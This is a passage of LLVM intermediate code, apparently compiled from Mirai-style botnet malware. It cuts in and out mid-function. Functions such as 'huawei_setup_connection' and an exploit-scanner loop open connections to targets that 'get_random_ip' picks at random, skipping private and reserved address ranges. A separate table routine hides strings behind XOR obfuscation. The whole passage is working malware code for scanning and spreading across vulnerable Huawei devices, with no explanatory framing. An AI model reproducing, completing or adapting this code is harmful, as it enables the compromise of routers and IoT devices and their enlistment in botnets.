  %687 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %688 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %687, i32 0, i32 0
  store i32 -1, i32* %688, align 8
  %689 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %690 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %689, i32 0, i32 2
  store i32 0, i32* %690, align 8
  %691 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %692 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %691, i32 0, i32 6
  %693 = getelementptr inbounds [256 x i8], [256 x i8]* %692, i32 0, i32 0
  call void @util_zero(i8* %693, i32 256)
  br label %694

; <label>:694:                                    ; preds = %682, %667, %663
  br label %713

; <label>:695:                                    ; preds = %660
  %696 = load i32, i32* %32, align 4
  %697 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %698 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %697, i32 0, i32 5
  %699 = load i32, i32* %698, align 4
  %700 = add nsw i32 %699, %696
  store i32 %700, i32* %698, align 4
  %701 = load i32, i32* @huawei_fake_time, align 4
  %702 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %703 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %702, i32 0, i32 1
  store i32 %701, i32* %703, align 4
  %704 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %705 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %704, i32 0, i32 6
  %706 = getelementptr inbounds [256 x i8], [256 x i8]* %705, i32 0, i32 0
  %707 = call i32 @util_strlen(i8* %706)
  store i32 %707, i32* %33, align 4
  %708 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %709 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %708, i32 0, i32 6
  %710 = load i32, i32* %33, align 4
  %711 = sext i32 %710 to i64
  %712 = getelementptr inbounds [256 x i8], [256 x i8]* %709, i64 0, i64 %711
  store i8 0, i8* %712, align 1
  br label %615

; <label>:713:                                    ; preds = %694, %620
  br label %714

; <label>:714:                                    ; preds = %713, %597
  br label %715

; <label>:715:                                    ; preds = %714, %587, %573, %543, %509
  %716 = load i32, i32* %1, align 4
  %717 = add nsw i32 %716, 1
  store i32 %717, i32* %1, align 4
  br label %497

; <label>:718:                                    ; preds = %497
  br label %137
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @get_random_ip.76() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i8, align 1
  %4 = alloca i8, align 1
  %5 = alloca i8, align 1
  %6 = alloca i8, align 1
  %7 = alloca i32, align 4
  store i8 0, i8* %3, align 1
  store i8 0, i8* %4, align 1
  store i8 0, i8* %5, align 1
  store i8 0, i8* %6, align 1
  br label %8

; <label>:8:                                      ; preds = %165, %0
  %9 = call i32 @rand_next()
  store i32 %9, i32* %2, align 4
  %10 = call i64 @time(i64* null) #6
  %11 = trunc i64 %10 to i32
  call void @srand(i32 %11) #6
  %12 = load i32, i32* %2, align 4
  %13 = and i32 %12, 255
  %14 = trunc i32 %13 to i8
  store i8 %14, i8* %3, align 1
  %15 = load i32, i32* %2, align 4
  %16 = lshr i32 %15, 8
  %17 = and i32 %16, 255
  %18 = trunc i32 %17 to i8
  store i8 %18, i8* %4, align 1
  %19 = load i32, i32* %2, align 4
  %20 = lshr i32 %19, 16
  %21 = and i32 %20, 255
  %22 = trunc i32 %21 to i8
  store i8 %22, i8* %5, align 1
  %23 = load i32, i32* %2, align 4
  %24 = lshr i32 %23, 24
  %25 = and i32 %24, 255
  %26 = trunc i32 %25 to i8
  store i8 %26, i8* %6, align 1
  br label %27

; <label>:27:                                     ; preds = %8
  %28 = load i8, i8* %3, align 1
  %29 = zext i8 %28 to i32
  %30 = icmp eq i32 %29, 127
  br i1 %30, label %165, label %31

; <label>:31:                                     ; preds = %27
  %32 = load i8, i8* %3, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 0
  br i1 %34, label %165, label %35

; <label>:35:                                     ; preds = %31
  %36 = load i8, i8* %3, align 1
  %37 = zext i8 %36 to i32
  %38 = icmp eq i32 %37, 3
  br i1 %38, label %165, label %39

; <label>:39:                                     ; preds = %35
  %40 = load i8, i8* %3, align 1
  %41 = zext i8 %40 to i32
  %42 = icmp eq i32 %41, 15
  br i1 %42, label %165, label %43

; <label>:43:                                     ; preds = %39
  %44 = load i8, i8* %3, align 1
  %45 = zext i8 %44 to i32
  %46 = icmp eq i32 %45, 16
  br i1 %46, label %165, label %47

; <label>:47:                                     ; preds = %43
  %48 = load i8, i8* %3, align 1
  %49 = zext i8 %48 to i32
  %50 = icmp eq i32 %49, 56
  br i1 %50, label %165, label %51

; <label>:51:                                     ; preds = %47
  %52 = load i8, i8* %3, align 1
  %53 = zext i8 %52 to i32
  %54 = icmp eq i32 %53, 10
  br i1 %54, label %165, label %55

; <label>:55:                                     ; preds = %51
  %56 = load i8, i8* %3, align 1
  %57 = zext i8 %56 to i32
  %58 = icmp eq i32 %57, 192
  br i1 %58, label %59, label %63

; <label>:59:                                     ; preds = %55
  %60 = load i8, i8* %4, align 1
  %61 = zext i8 %60 to i32
  %62 = icmp eq i32 %61, 168
  br i1 %62, label %165, label %63

; <label>:63:                                     ; preds = %59, %55
  %64 = load i8, i8* %3, align 1
  %65 = zext i8 %64 to i32
  %66 = icmp eq i32 %65, 172
  br i1 %66, label %67, label %75

; <label>:67:                                     ; preds = %63
  %68 = load i8, i8* %4, align 1
  %69 = zext i8 %68 to i32
  %70 = icmp sge i32 %69, 16
  br i1 %70, label %71, label %75

; <label>:71:                                     ; preds = %67
  %72 = load i8, i8* %4, align 1
  %73 = zext i8 %72 to i32
  %74 = icmp slt i32 %73, 32
  br i1 %74, label %165, label %75

; <label>:75:                                     ; preds = %71, %67, %63
  %76 = load i8, i8* %3, align 1
  %77 = zext i8 %76 to i32
  %78 = icmp eq i32 %77, 100
  br i1 %78, label %79, label %87

; <label>:79:                                     ; preds = %75
  %80 = load i8, i8* %4, align 1
  %81 = zext i8 %80 to i32
  %82 = icmp sge i32 %81, 64
  br i1 %82, label %83, label %87

; <label>:83:                                     ; preds = %79
  %84 = load i8, i8* %4, align 1
  %85 = zext i8 %84 to i32
  %86 = icmp slt i32 %85, 127
  br i1 %86, label %165, label %87

; <label>:87:                                     ; preds = %83, %79, %75
  %88 = load i8, i8* %3, align 1
  %89 = zext i8 %88 to i32
  %90 = icmp eq i32 %89, 169
  br i1 %90, label %91, label %95

; <label>:91:                                     ; preds = %87
  %92 = load i8, i8* %4, align 1
  %93 = zext i8 %92 to i32
  %94 = icmp sgt i32 %93, 254
  br i1 %94, label %165, label %95

; <label>:95:                                     ; preds = %91, %87
  %96 = load i8, i8* %3, align 1
  %97 = zext i8 %96 to i32
  %98 = icmp eq i32 %97, 198
  br i1 %98, label %99, label %107

; <label>:99:                                     ; preds = %95
  %100 = load i8, i8* %4, align 1
  %101 = zext i8 %100 to i32
  %102 = icmp sge i32 %101, 18
  br i1 %102, label %103, label %107

; <label>:103:                                    ; preds = %99
  %104 = load i8, i8* %4, align 1
  %105 = zext i8 %104 to i32
  %106 = icmp slt i32 %105, 20
  br i1 %106, label %165, label %107

; <label>:107:                                    ; preds = %103, %99, %95
  %108 = load i8, i8* %3, align 1
  %109 = zext i8 %108 to i32
  %110 = icmp sge i32 %109, 224
  br i1 %110, label %165, label %111

; <label>:111:                                    ; preds = %107
  %112 = load i8, i8* %3, align 1
  %113 = zext i8 %112 to i32
  %114 = icmp eq i32 %113, 6
  br i1 %114, label %163, label %115

; <label>:115:                                    ; preds = %111
  %116 = load i8, i8* %3, align 1
  %117 = zext i8 %116 to i32
  %118 = icmp eq i32 %117, 7
  br i1 %118, label %163, label %119

; <label>:119:                                    ; preds = %115
  %120 = load i8, i8* %3, align 1
  %121 = zext i8 %120 to i32
  %122 = icmp eq i32 %121, 11
  br i1 %122, label %163, label %123

; <label>:123:                                    ; preds = %119
  %124 = load i8, i8* %3, align 1
  %125 = zext i8 %124 to i32
  %126 = icmp eq i32 %125, 21
  br i1 %126, label %163, label %127

; <label>:127:                                    ; preds = %123
  %128 = load i8, i8* %3, align 1
  %129 = zext i8 %128 to i32
  %130 = icmp eq i32 %129, 22
  br i1 %130, label %163, label %131

; <label>:131:                                    ; preds = %127
  %132 = load i8, i8* %3, align 1
  %133 = zext i8 %132 to i32
  %134 = icmp eq i32 %133, 26
  br i1 %134, label %163, label %135

; <label>:135:                                    ; preds = %131
  %136 = load i8, i8* %3, align 1
  %137 = zext i8 %136 to i32
  %138 = icmp eq i32 %137, 28
  br i1 %138, label %163, label %139

; <label>:139:                                    ; preds = %135
  %140 = load i8, i8* %3, align 1
  %141 = zext i8 %140 to i32
  %142 = icmp eq i32 %141, 29
  br i1 %142, label %163, label %143

; <label>:143:                                    ; preds = %139
  %144 = load i8, i8* %3, align 1
  %145 = zext i8 %144 to i32
  %146 = icmp eq i32 %145, 30
  br i1 %146, label %163, label %147

; <label>:147:                                    ; preds = %143
  %148 = load i8, i8* %3, align 1
  %149 = zext i8 %148 to i32
  %150 = icmp eq i32 %149, 33
  br i1 %150, label %163, label %151

; <label>:151:                                    ; preds = %147
  %152 = load i8, i8* %3, align 1
  %153 = zext i8 %152 to i32
  %154 = icmp eq i32 %153, 55
  br i1 %154, label %163, label %155

; <label>:155:                                    ; preds = %151
  %156 = load i8, i8* %3, align 1
  %157 = zext i8 %156 to i32
  %158 = icmp eq i32 %157, 214
  br i1 %158, label %163, label %159

; <label>:159:                                    ; preds = %155
  %160 = load i8, i8* %3, align 1
  %161 = zext i8 %160 to i32
  %162 = icmp eq i32 %161, 215
  br label %163

; <label>:163:                                    ; preds = %159, %155, %151, %147, %143, %139, %135, %131, %127, %123, %119, %115, %111
  %164 = phi i1 [ true, %155 ], [ true, %151 ], [ true, %147 ], [ true, %143 ], [ true, %139 ], [ true, %135 ], [ true, %131 ], [ true, %127 ], [ true, %123 ], [ true, %119 ], [ true, %115 ], [ true, %111 ], [ %162, %159 ]
  br label %165

; <label>:165:                                    ; preds = %163, %107, %103, %91, %83, %71, %59, %51, %47, %43, %39, %35, %31, %27
  %166 = phi i1 [ true, %107 ], [ true, %103 ], [ true, %91 ], [ true, %83 ], [ true, %71 ], [ true, %59 ], [ true, %51 ], [ true, %47 ], [ true, %43 ], [ true, %39 ], [ true, %35 ], [ true, %31 ], [ true, %27 ], [ %164, %163 ]
  br i1 %166, label %8, label %167

; <label>:167:                                    ; preds = %165
  %168 = call i32 @rand() #6
  %169 = srem i32 %168, 3
  store i32 %169, i32* %7, align 4
  %170 = load i32, i32* %7, align 4
  %171 = icmp eq i32 %170, 0
  br i1 %171, label %172, label %186

; <label>:172:                                    ; preds = %167
  %173 = load i8, i8* %4, align 1
  %174 = zext i8 %173 to i32
  %175 = shl i32 %174, 16
  %176 = or i32 -1677721600, %175
  %177 = load i8, i8* %5, align 1
  %178 = zext i8 %177 to i32
  %179 = shl i32 %178, 8
  %180 = or i32 %176, %179
  %181 = load i8, i8* %6, align 1
  %182 = zext i8 %181 to i32
  %183 = shl i32 %182, 0
  %184 = or i32 %180, %183
  %185 = call i32 @htonl(i32 %184) #9
  store i32 %185, i32* %1, align 4
  br label %240

; <label>:186:                                    ; preds = %167
  %187 = load i32, i32* %7, align 4
  %188 = icmp eq i32 %187, 1
  br i1 %188, label %189, label %203

; <label>:189:                                    ; preds = %186
  %190 = load i8, i8* %4, align 1
  %191 = zext i8 %190 to i32
  %192 = shl i32 %191, 16
  %193 = or i32 -989855744, %192
  %194 = load i8, i8* %5, align 1
  %195 = zext i8 %194 to i32
  %196 = shl i32 %195, 8
  %197 = or i32 %193, %196
  %198 = load i8, i8* %6, align 1
  %199 = zext i8 %198 to i32
  %200 = shl i32 %199, 0
  %201 = or i32 %197, %200
  %202 = call i32 @htonl(i32 %201) #9
  store i32 %202, i32* %1, align 4
  br label %240

; <label>:203:                                    ; preds = %186
  %204 = load i32, i32* %7, align 4
  %205 = icmp eq i32 %204, 2
  br i1 %205, label %206, label %220

; <label>:206:                                    ; preds = %203
  %207 = load i8, i8* %4, align 1
  %208 = zext i8 %207 to i32
  %209 = shl i32 %208, 16
  %210 = or i32 687865856, %209
  %211 = load i8, i8* %5, align 1
  %212 = zext i8 %211 to i32
  %213 = shl i32 %212, 8
  %214 = or i32 %210, %213
  %215 = load i8, i8* %6, align 1
  %216 = zext i8 %215 to i32
  %217 = shl i32 %216, 0
  %218 = or i32 %214, %217
  %219 = call i32 @htonl(i32 %218) #9
  store i32 %219, i32* %1, align 4
  br label %240

; <label>:220:                                    ; preds = %203
  %221 = load i32, i32* %7, align 4
  %222 = icmp eq i32 %221, 3
  br i1 %222, label %223, label %240

; <label>:223:                                    ; preds = %220
  %224 = load i8, i8* %3, align 1
  %225 = zext i8 %224 to i32
  %226 = shl i32 %225, 24
  %227 = load i8, i8* %4, align 1
  %228 = zext i8 %227 to i32
  %229 = shl i32 %228, 16
  %230 = or i32 %226, %229
  %231 = load i8, i8* %5, align 1
  %232 = zext i8 %231 to i32
  %233 = shl i32 %232, 8
  %234 = or i32 %230, %233
  %235 = load i8, i8* %6, align 1
  %236 = zext i8 %235 to i32
  %237 = shl i32 %236, 0
  %238 = or i32 %234, %237
  %239 = call i32 @htonl(i32 %238) #9
  store i32 %239, i32* %1, align 4
  br label %240

; <label>:240:                                    ; preds = %223, %220, %206, %189, %172
  %241 = load i32, i32* %1, align 4
  ret i32 %241
}

; Function Attrs: noinline nounwind uwtable
define internal void @huawei_setup_connection(%struct.exploit_scanner_connection*) #0 {
  %2 = alloca %struct.exploit_scanner_connection*, align 8
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store %struct.exploit_scanner_connection* %0, %struct.exploit_scanner_connection** %2, align 8
  %5 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %5, i8 0, i64 16, i32 4, i1 false)
  %6 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %7 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %6, i32 0, i32 0
  %8 = load i32, i32* %7, align 8
  %9 = icmp ne i32 %8, -1
  br i1 %9, label %10, label %15

; <label>:10:                                     ; preds = %1
  %11 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %12 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %11, i32 0, i32 0
  %13 = load i32, i32* %12, align 8
  %14 = call i32 @close(i32 %13)
  br label %15

; <label>:15:                                     ; preds = %10, %1
  %16 = call i32 @socket(i32 2, i32 1, i32 0) #6
  %17 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %18 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %17, i32 0, i32 0
  store i32 %16, i32* %18, align 8
  %19 = icmp eq i32 %16, -1
  br i1 %19, label %20, label %21

; <label>:20:                                     ; preds = %15
  br label %71

; <label>:21:                                     ; preds = %15
  %22 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %23 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %22, i32 0, i32 5
  store i32 0, i32* %23, align 4
  %24 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %25 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %24, i32 0, i32 6
  %26 = getelementptr inbounds [256 x i8], [256 x i8]* %25, i32 0, i32 0
  call void @util_zero(i8* %26, i32 256)
  %27 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %28 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %27, i32 0, i32 0
  %29 = load i32, i32* %28, align 8
  %30 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %31 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %30, i32 0, i32 0
  %32 = load i32, i32* %31, align 8
  %33 = call i32 (i32, i32, ...) @fcntl(i32 %32, i32 3, i32 0)
  %34 = or i32 2048, %33
  %35 = call i32 (i32, i32, ...) @fcntl(i32 %29, i32 4, i32 %34)
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %36, align 4
  %37 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %38 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %37, i32 0, i32 3
  %39 = load i32, i32* %38, align 4
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %41 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %40, i32 0, i32 0
  store i32 %39, i32* %41, align 4
  %42 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %43 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %42, i32 0, i32 4
  %44 = load i16, i16* %43, align 8
  %45 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %44, i16* %45, align 2
  %46 = load i32, i32* @huawei_fake_time, align 4
  %47 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %48 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %47, i32 0, i32 1
  store i32 %46, i32* %48, align 4
  %49 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %50 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %49, i32 0, i32 2
  %51 = load i32, i32* %50, align 8
  %52 = icmp eq i32 %51, 3
  br i1 %52, label %58, label %53

; <label>:53:                                     ; preds = %21
  %54 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %55 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %54, i32 0, i32 2
  %56 = load i32, i32* %55, align 8
  %57 = icmp eq i32 %56, 4
  br i1 %57, label %58, label %59

; <label>:58:                                     ; preds = %53, %21
  br label %62

; <label>:59:                                     ; preds = %53
  %60 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %61 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %60, i32 0, i32 2
  store i32 1, i32* %61, align 8
  br label %62

; <label>:62:                                     ; preds = %59, %58
  %63 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %2, align 8
  %64 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %63, i32 0, i32 0
  %65 = load i32, i32* %64, align 8
  %66 = bitcast %union.__CONST_SOCKADDR_ARG* %4 to %struct.sockaddr**
  %67 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  store %struct.sockaddr* %67, %struct.sockaddr** %66, align 8
  %68 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %4, i32 0, i32 0
  %69 = load %struct.sockaddr*, %struct.sockaddr** %68, align 8
  %70 = call i32 @connect(i32 %65, %struct.sockaddr* %69, i32 16)
  br label %71

; <label>:71:                                     ; preds = %62, %20
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @huawei_recv_strip_null(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  %11 = load i32, i32* %5, align 4
  %12 = load i8*, i8** %6, align 8
  %13 = load i32, i32* %7, align 4
  %14 = sext i32 %13 to i64
  %15 = load i32, i32* %8, align 4
  %16 = call i64 @recv(i32 %11, i8* %12, i64 %14, i32 %15)
  %17 = trunc i64 %16 to i32
  store i32 %17, i32* %9, align 4
  %18 = load i32, i32* %9, align 4
  %19 = icmp sgt i32 %18, 0
  br i1 %19, label %20, label %43

; <label>:20:                                     ; preds = %4
  store i32 0, i32* %10, align 4
  store i32 0, i32* %10, align 4
  br label %21

; <label>:21:                                     ; preds = %39, %20
  %22 = load i32, i32* %10, align 4
  %23 = load i32, i32* %9, align 4
  %24 = icmp slt i32 %22, %23
  br i1 %24, label %25, label %42

; <label>:25:                                     ; preds = %21
  %26 = load i8*, i8** %6, align 8
  %27 = load i32, i32* %10, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds i8, i8* %26, i64 %28
  %30 = load i8, i8* %29, align 1
  %31 = sext i8 %30 to i32
  %32 = icmp eq i32 %31, 0
  br i1 %32, label %33, label %38

; <label>:33:                                     ; preds = %25
  %34 = load i8*, i8** %6, align 8
  %35 = load i32, i32* %10, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds i8, i8* %34, i64 %36
  store i8 65, i8* %37, align 1
  br label %38

; <label>:38:                                     ; preds = %33, %25
  br label %39

; <label>:39:                                     ; preds = %38
  %40 = load i32, i32* %10, align 4
  %41 = add nsw i32 %40, 1
  store i32 %41, i32* %10, align 4
  br label %21

; <label>:42:                                     ; preds = %21
  br label %43

; <label>:43:                                     ; preds = %42, %4
  %44 = load i32, i32* %9, align 4
  ret i32 %44
}

; Function Attrs: noinline nounwind uwtable
define void @rand_init() #0 {
  %1 = call i64 @time(i64* null) #6
  %2 = trunc i64 %1 to i32
  store i32 %2, i32* @x, align 4
  %3 = call i32 @getpid() #6
  %4 = call i32 @getppid() #6
  %5 = xor i32 %3, %4
  store i32 %5, i32* @y, align 4
  %6 = call i64 @clock() #6
  %7 = trunc i64 %6 to i32
  store i32 %7, i32* @z, align 4
  %8 = load i32, i32* @z, align 4
  %9 = load i32, i32* @y, align 4
  %10 = xor i32 %8, %9
  store i32 %10, i32* @w, align 4
  ret void
}

; Function Attrs: nounwind
declare i32 @getppid() #2

; Function Attrs: nounwind
declare i64 @clock() #2

; Function Attrs: noinline nounwind uwtable
define i32 @rand_next() #0 {
  %1 = alloca i32, align 4
  %2 = load i32, i32* @x, align 4
  store i32 %2, i32* %1, align 4
  %3 = load i32, i32* %1, align 4
  %4 = shl i32 %3, 11
  %5 = load i32, i32* %1, align 4
  %6 = xor i32 %5, %4
  store i32 %6, i32* %1, align 4
  %7 = load i32, i32* %1, align 4
  %8 = lshr i32 %7, 8
  %9 = load i32, i32* %1, align 4
  %10 = xor i32 %9, %8
  store i32 %10, i32* %1, align 4
  %11 = load i32, i32* @y, align 4
  store i32 %11, i32* @x, align 4
  %12 = load i32, i32* @z, align 4
  store i32 %12, i32* @y, align 4
  %13 = load i32, i32* @w, align 4
  store i32 %13, i32* @z, align 4
  %14 = load i32, i32* @w, align 4
  %15 = lshr i32 %14, 19
  %16 = load i32, i32* @w, align 4
  %17 = xor i32 %16, %15
  store i32 %17, i32* @w, align 4
  %18 = load i32, i32* %1, align 4
  %19 = load i32, i32* @w, align 4
  %20 = xor i32 %19, %18
  store i32 %20, i32* @w, align 4
  %21 = load i32, i32* @w, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind uwtable
define void @table_init() #0 {
  call void @add_entry(i8 zeroext 1, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.84, i32 0, i32 0), i32 14)
  call void @add_entry(i8 zeroext 2, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.1.85, i32 0, i32 0), i32 19)
  call void @add_entry(i8 zeroext 3, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.2.86, i32 0, i32 0), i32 23)
  call void @add_entry(i8 zeroext 4, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.3.87, i32 0, i32 0), i32 24)
  call void @add_entry(i8 zeroext 5, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.4.88, i32 0, i32 0), i32 15)
  call void @add_entry(i8 zeroext 6, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.5.89, i32 0, i32 0), i32 22)
  call void @add_entry(i8 zeroext 7, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.6.90, i32 0, i32 0), i32 15)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal void @add_entry(i8 zeroext, i8*, i32) #0 {
  %4 = alloca i8, align 1
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  store i8 %0, i8* %4, align 1
  store i8* %1, i8** %5, align 8
  store i32 %2, i32* %6, align 4
  %8 = load i32, i32* %6, align 4
  %9 = sext i32 %8 to i64
  %10 = call noalias i8* @malloc(i64 %9) #6
  store i8* %10, i8** %7, align 8
  %11 = load i8*, i8** %7, align 8
  %12 = load i8*, i8** %5, align 8
  %13 = load i32, i32* %6, align 4
  call void @util_memcpy(i8* %11, i8* %12, i32 %13)
  %14 = load i8*, i8** %7, align 8
  %15 = load i8, i8* %4, align 1
  %16 = zext i8 %15 to i64
  %17 = getelementptr inbounds [8 x %struct.table_value], [8 x %struct.table_value]* @table, i64 0, i64 %16
  %18 = getelementptr inbounds %struct.table_value, %struct.table_value* %17, i32 0, i32 0
  store i8* %14, i8** %18, align 16
  %19 = load i32, i32* %6, align 4
  %20 = trunc i32 %19 to i16
  %21 = load i8, i8* %4, align 1
  %22 = zext i8 %21 to i64
  %23 = getelementptr inbounds [8 x %struct.table_value], [8 x %struct.table_value]* @table, i64 0, i64 %22
  %24 = getelementptr inbounds %struct.table_value, %struct.table_value* %23, i32 0, i32 1
  store i16 %20, i16* %24, align 8
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @table_unlock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [8 x %struct.table_value], [8 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal void @toggle_obf(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca i32, align 4
  %4 = alloca %struct.table_value*, align 8
  %5 = alloca i8, align 1
  %6 = alloca i8, align 1
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %9 = load i8, i8* %2, align 1
  %10 = zext i8 %9 to i64
  %11 = getelementptr inbounds [8 x %struct.table_value], [8 x %struct.table_value]* @table, i64 0, i64 %10
  store %struct.table_value* %11, %struct.table_value** %4, align 8
  %12 = load i32, i32* @table_key, align 4
  %13 = and i32 %12, 255
  %14 = trunc i32 %13 to i8
  store i8 %14, i8* %5, align 1
  %15 = load i32, i32* @table_key, align 4
  %16 = lshr i32 %15, 8
  %17 = and i32 %16, 255
  %18 = trunc i32 %17 to i8
  store i8 %18, i8* %6, align 1
  %19 = load i32, i32* @table_key, align 4
  %20 = lshr i32 %19, 16
  %21 = and i32 %20, 255
  %22 = trunc i32 %21 to i8
  store i8 %22, i8* %7, align 1
  %23 = load i32, i32* @table_key, align 4
  %24 = lshr i32 %23, 24
  %25 = and i32 %24, 255
  %26 = trunc i32 %25 to i8
  store i8 %26, i8* %8, align 1
  store i32 0, i32* %3, align 4
  br label %27

; <label>:27:                                     ; preds = %83, %1
  %28 = load i32, i32* %3, align 4
  %29 = load %struct.table_value*, %struct.table_value** %4, align 8
  %30 = getelementptr inbounds %struct.table_value, %struct.table_value* %29, i32 0, i32 1
  %31 = load i16, i16* %30, align 8
  %32 = zext i16 %31 to i32
  %33 = icmp slt i32 %28, %32
  br i1 %33, label %34, label %86

; <label>:34:                                     ; preds = %27
  %35 = load i8, i8* %5, align 1
  %36 = zext i8 %35 to i32
  %37 = load %struct.table_value*, %struct.table_value** %4, align 8
  %38 = getelementptr inbounds %struct.table_value, %struct.table_value* %37, i32 0, i32 0
  %39 = load i8*, i8** %38, align 8
  %40 = load i32, i32* %3, align 4
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds i8, i8* %39, i64 %41
  %43 = load i8, i8* %42, align 1
  %44 = sext i8 %43 to i32
  %45 = xor i32 %44, %36
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %42, align 1
  %47 = load i8, i8* %6, align 1
  %48 = zext i8 %47 to i32
  %49 = load %struct.table_value*, %struct.table_value** %4, align 8
  %50 = getelementptr inbounds %struct.table_value, %struct.table_value* %49, i32 0, i32 0
  %51 = load i8*, i8** %50, align 8
  %52 = load i32, i32* %3, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = sext i8 %55 to i32
  %57 = xor i32 %56, %48
  %58 = trunc i32 %57 to i8
  store i8 %58, i8* %54, align 1
  %59 = load i8, i8* %7, align 1
  %60 = zext i8 %59 to i32
  %61 = load %struct.table_value*, %struct.table_value** %4, align 8
  %62 = getelementptr inbounds %struct.table_value, %struct.table_value* %61, i32 0, i32 0
  %63 = load i8*, i8** %62, align 8
